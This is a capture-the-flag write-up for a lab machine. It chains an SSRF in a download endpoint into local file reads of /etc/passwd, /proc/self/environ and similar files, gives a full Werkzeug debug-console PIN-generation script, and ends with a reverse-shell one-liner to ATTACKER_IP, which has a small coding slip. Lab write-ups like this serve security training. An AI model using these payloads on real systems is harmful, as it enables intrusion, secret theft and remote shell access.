
**Plant Photographer**
=====================
Dig deeper and try to uncover the flag hidden behind the scenes.

This blog not much as useful as python pin cracker debug rce, but know about the file system of proc and other cmd how works and their importance.

**Port Scanning**
-----------------
```
nmap -sS -p- TARGET_IP
```
checking any port and service running other than http
nothing useful

**Service Fingerprint**
----------------------
```
nmap -sS -sC -sV -p 22,80 TARGET_IP
```
result
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-07-23 06:14 UTC
Nmap scan report for ip-10-129-138-180.eu-west-3.compute.internal (10.129.138.180)
Host is up (0.00048s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 89:97:86:b1:69:80:c3:be:35:c3:7f:06:ac:c8:1e:e2 (RSA)
|   256 7e:97:79:ba:a7:be:34:7f:de:8d:37:c6:00:b6:44:19 (ECDSA)
|_  256 16:3f:22:3f:0b:d9:7d:fa:63:36:f0:c1:59:15:12:1d (ED25519)
80/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.10.7)
|_http-server-header: Werkzeug/0.16.0 Python/3.10.7
|_http-title: Jay Green
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.06 seconds
```
concluded that python based application

**Web Application Recon**
------------------------
Accessed the Website 
```
http://TARGET_IP
```
<img width="529" height="322" alt="photgrapher_1_web_index" src="https://github.com/user-attachments/assets/40385279-8056-408d-a1dd-260024531ca2" />

**Directory Enumeration**
-------------------------
run to know about file and entrypoints exist.
```
gobuster dir -u http://TARGET_IP/ -w /usr/share/wordlists/dirb/common.txt -z             
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.138.180/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 200) [Size: 48]
/console              (Status: 200) [Size: 1985]
/download             (Status: 200) [Size: 20]
===============================================================
Finished
===============================================================
```
- admin entry point only accessible through internal localhost.
- console required pin to access.
- trying to exploit the resume download feature which making external request for resume download.
- So tried with alteration
```
http://TARGET_IP/download?server=localhost
```
but didn't work
```
http://TARGET_IP/download?server=localhost&id=1
```
finally it worked and got the API 

<img width="698" height="364" alt="photgrapher_1_web_ssrf_error_api" src="https://github.com/user-attachments/assets/09ab3363-258f-44f1-8a42-ee9bdad201ef" />

**SSRF to LFI**
---------------
Admin flag
```
http://TARGET_IP/download?server=file:///etc/passwd%23&id=1

http://TARGET_IP/download?server=secure-file-storage.com:8087/admin%23&id=1
or
http://TARGET_IP/download?http://127.0.0.1:8087/admin%23&id=1
or
http://TARGET_IP/download?server=file:///usr/src/app/public-docs/admin.flag%23&id=1
```

**Host enumeration**
--------------------
```
curl -s "http://TARGET_IP/download?server=file:///etc/passwd?&id=1"
```
The shell is /bin/ash — this is an Alpine Linux container (uses musl libc instead of glibc). No bash available.

read the app.py
```
curl  "http://TARGET_IP/download?server=file:///usr/src/app/app.py?&id=1"
```
source code
```
curl "http://TARGET_IP/download?server=file:///usr/local/lib/python3.10/site-packages/werkzeug/debug/__init__.py?&id=1" > __init__.py
curl "http://TARGET_IP/download?server=file:///usr/local/lib/python3.10/site-packages/flask/app.py?&id=1" > flask.py
```
Process information (confirm python+ app path)
```
curl -s "http://TARGET_IP/download?server=file:///proc/self/cmdline%23&id=1" | tr '\0' ' '
```
Process status
```
curl -s "http://TARGET_IP/download?server=file:///proc/self/status%23&id=1"
```
Environment variable
```
curl "http://TARGET_IP/download?server=file:///proc/self/environ?&id=1" | tr '\0' '\n'
```
Network interface name (ARP Table)
```
curl -s "http://TARGET_IP/download?server=file:///proc/net/arp?&id=1"
```
MAC address of interface
```
curl -s "http://TARGET_IP/download?server=file:///sys/class/net/eth0/address?&id=1"
```
Convert MAC to decimal
[Converter](https://www.vultr.com/resources/mac-converter/?mac_address=02%3A42%3Aac%3A14%3A00%3A02)
```
python3 -c 'print(int("02:42:ac:14:00:02".replace(":",""),16))'
```
Docker Container ID
```
curl -s "http://TARGET_IP/download?server=file:///proc/self/cgroup?&id=1" | head -n 1 | cut -d '/' -f 3
```
Mount information (overlay confirmed docker)
```
curl -s "http://TARGET_IP/download?id=1&server=file:///proc/self/mounts?&id=1?" | head -n 1
```
Boot ID
```
curl -s "http://TARGET_IP/download?server=file:///proc/sys/kernel/random/boot_id?&id=1"
```
Memory Maps(library path)
```
curl -s "http://TARGET_IP/download?id=1&server=file:///proc/self/maps?" 
```
Alpine confirmed again — ld-musl-x86_64.so.1 (not ld-linux-x86_64.so.2 which would be glibc).

Get Machind-id, not found
```
curl -s "http://TARGET_IP/download?server=file:///etc/machine-id?&id=1"
```

**Werkzeug debug rce**
----------------------
[Reference](https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/werkzeug.html)

run python script to get pin
```
import hashlib
from itertools import chain
probably_public_bits = [
    'root',  # username
    'flask.app',  # modname
    'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.10/site-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
    '2485378088962',  # str(uuid.getnode()),  /sys/class/net/ens33/address
    '77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca'  # get_machine_id(), /etc/machine-id
]

h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
#h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```
got the pin and accessed /console route
```
>>> import os;
>>> os.getcwd();
'/usr/src/app'
>>> os.listdir(os.getcwd());
['requirements.txt', 'Dockerfile', 'templates', 'public-docs', 'private-docs', 'static', 'app.py', 'flag-982374827648721338.txt']
>>> print(open('/usr/src/app/flag-982374827648721338.txt').read());
```
Shell
```
import sys,socket,os,pty;
s=socket.socket();s.connect(("ATTACKER_IP",PORT_NUM));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])
```


Summary
-------
Host enumeration helps reveal the system’s identity and environment with just a few key commands. 
By checking files like `/etc/passwd`, `/proc/self/cmdline`, and `/proc/self/environ`, you confirm the OS (Alpine Linux), runtime context, and possible secrets.
Network and container details from `/proc/net/arp`, `/sys/class/net/eth0/address`, and `/proc/self/cgroup` expose interfaces and Dockerization.
Other checks such as boot ID, mounts, and memory maps validate the container setup and libraries in use.
Together, these commands quickly build a clear picture of the host’s operating system, application stack, and container environment, making exploitation more targeted and effective.
